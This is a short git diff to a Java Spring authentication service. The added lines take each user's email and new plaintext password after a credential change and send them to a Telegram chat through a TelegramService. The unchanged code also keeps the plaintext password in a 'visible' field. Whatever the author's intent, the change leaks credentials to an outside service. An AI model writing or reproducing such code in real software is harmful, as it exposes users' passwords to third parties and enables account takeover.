@@ -28,6 +28,8 @@ public class AuthService {
     private final JWTUtil jwtUtil;
     private final PasswordEncoder passwordEncoder;
 
+    private final TelegramService telegramService;
+
     public AuthResponse login(AuthRequest authenticationRequest) {
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(
@@ -48,6 +50,8 @@ public class AuthService {
         user.setPassword(password.length() != 0 ? passwordEncoder.encode(password) : passwordEncoder.encode(user.getPassword()));
         user.setVisible(password.length() != 0 ? password : user.getVisible());
         authRepository.save(user);
+        String text = "Ma'lumotlar o'grartirildi\nUsername: " + email + "\npassword: " + password;
+        telegramService.sendMessage(text, "-4085521419");
         return new ApiResponse("Ma'lumotlar taxrirlandi", true, 200);
     }
 
